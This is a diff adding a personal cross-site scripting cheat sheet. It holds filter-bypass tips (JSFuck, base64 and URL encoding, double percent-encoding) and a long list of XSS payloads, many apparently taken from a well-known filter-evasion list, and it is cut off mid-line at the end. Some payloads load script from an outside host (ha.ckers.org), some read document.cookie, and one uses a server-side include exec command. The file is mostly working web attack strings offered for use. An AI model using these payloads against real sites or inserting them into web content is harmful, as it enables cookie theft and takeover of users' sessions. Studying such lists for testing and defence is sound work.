@@ -1,0 +1,214 @@
+Easy:
+<script>execute code</script>
+
+Medium:
+<svg onload="Js code">
+<IMG """><script>JS Code</script>">
+<scri<script>pt>JS Code</script>
+"><img src="link" onerror=Js code;
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS injection/Files/SVG_XSS.svg
+
+Hight:
+<body onload="JS code">
+
+Bypass htmlspecialchars and strtoupper:
+
+' onmouseover='Js code encoded to Jsfuck
+
+ENDODE IT ON BASE64 AND RE ENCODE ON URLENCODER
+
+JSON XSS:
+
+"}]}';</script><script>alert('XSS by Abdx')
+<script>prompt()</script>
+
+
+XSS HEXADICIMAL ENCODING:
+
+“<” 	“%3C” 	“%25” 	“%253C”
+“/” 	“%2F” 	“%25” 	“%252F”
+“>” 	“%3E” 	“%25” 	“%253E”
+
+
+%253Cscript%253Ealert('XSS by Abdx')%253C%252Fscript%253E
+
+
+
+________________________________________
+
+Js Xss Codes.
+
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+'';!--"<XSS>=&{()}
+
+0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+
+<script/src=data:,alert()>
+
+<marquee/onstart=alert()>
+
+<video/poster/onerror=alert()>
+
+<isindex/autofocus/onfocus=alert()>
+
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC=javascript:alert('XSS')>
+
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+
+<IMG SRC=javascript:alert("XSS")>
+
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+
+<a onmouseover="alert(document.cookie)">xxs link</a>
+
+<a onmouseover=alert(document.cookie)>xxs link</a>
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+<IMG SRC=# onmouseover="alert('xxs')">
+
+<IMG SRC= onmouseover="alert('xxs')">
+
+<IMG onmouseover="alert('xxs')">
+
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+
+<IMG SRC=javascript:alert(
+
+'XSS')>
+
+<IMG SRC=javascript:a&
+
+#0000108ert('XSS')>
+
+<IMG SRC=javascript:alert('XSS')>
+
+<IMG SRC="jav	ascript:alert('XSS');">
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC=" javascript:alert('XSS');">
+
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+
+<SCRIPT SRC=//ha.ckers.org/.j>
+
+<IMG SRC="javascript:alert('XSS')"
+
+<iframe src=http://ha.ckers.org/scriptlet.html <
+
+\";alert('XSS');//
+
+</script><script>alert('XSS');</script>
+
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+
+<IMG DYNSRC="javascript:alert('XSS')">
+
+<IMG LOWSRC="javascript:alert('XSS')">
+
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+
+<IMG SRC='vbscript:msgbox("XSS")'>
+
+<IMG SRC="livescript:[code]">
+
+<BODY ONLOAD=alert('XSS')>
+
+<BGSOUND SRC="javascript:alert('XSS');">
+
+<BR SIZE="&{alert('XSS')}">
+
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+exp/*<A STYLE='no\xss:noxss("//");
+
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+<XSS STYLE="xss:expression(alert('XSS'))">
+
+<XSS STYLE="behavior: url(xss.htc);">
+
+¼script¾alert(¢XSS¢)¼/script¾
+
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+<TABLE BACKGROUND="javascript:alert('XSS')">
+
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+
+<DIV STYLE="width: expression(alert('XSS'));">
+
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+
+"autofocus/onfocus=alert(`Bug´)
+
+<BASE HREF="javascript:alert('XSS');//">
+
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('X
